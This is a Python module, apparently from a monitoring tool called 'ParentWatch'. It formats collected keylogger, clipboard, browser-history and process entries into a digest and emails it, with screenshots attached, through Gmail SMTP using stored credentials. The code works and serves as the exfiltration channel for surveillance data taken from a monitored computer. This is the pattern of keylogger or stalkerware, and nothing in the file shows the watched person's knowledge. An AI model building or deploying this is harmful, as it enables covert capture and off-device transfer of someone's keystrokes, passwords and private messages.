# email_delivery.py — sends daily digest via Gmail

import smtplib, io
from email.mime.multipart import MIMEMultipart
from email.mime.text      import MIMEText
from email.mime.base      import MIMEBase
from email                import encoders
from datetime             import datetime
from pathlib              import Path
from typing               import Optional


def send_report(
    email_from:    str,
    email_password: str,
    email_to:      str,
    subject_prefix: str,
    text_body:     str,
    screenshots:   Optional[list] = None,   # list of (filename, png_bytes)
):
    """
    Send a report email via Gmail SMTP.
    screenshots = list of (filename_str, png_bytes) tuples — attached as images.
    """
    msg = MIMEMultipart()
    msg["From"]    = email_from
    msg["To"]      = email_to
    msg["Subject"] = f"{subject_prefix} Report — {datetime.now().strftime('%Y-%m-%d %H:%M')}"

    msg.attach(MIMEText(text_body, "plain", "utf-8"))

    # Attach screenshots if provided
    if screenshots:
        for fname, png_bytes in screenshots:
            part = MIMEBase("image", "png")
            part.set_payload(png_bytes)
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f'attachment; filename="{fname}"')
            msg.attach(part)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(email_from, email_password)
            server.sendmail(email_from, email_to, msg.as_string())
        return True
    except Exception as e:
        return False


def build_report_text(entries: list) -> str:
    """
    Format vault entries into a readable email body.
    entries = list of dicts: {ts, category, text}
    """
    if not entries:
        return "No activity recorded in this period."

    sections = {}
    for e in entries:
        sections.setdefault(e["category"], []).append(e)

    lines = [f"ParentWatch Report — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"]
    lines.append("=" * 60)

    order = ["browser", "keylog", "clipboard", "process"]
    for cat in order:
        if cat not in sections:
            continue
        items = sections[cat]
        lines.append(f"\n{'='*60}")
        lines.append(f"  {cat.upper()}  ({len(items)} entries)")
        lines.append(f"{'='*60}")
        for item in items[-50:]:   # last 50 per category to keep email size sane
            lines.append(f"\n[{item['ts']}]")
            lines.append(item["text"][:2000])  # cap per entry

    return "\n".join(lines)
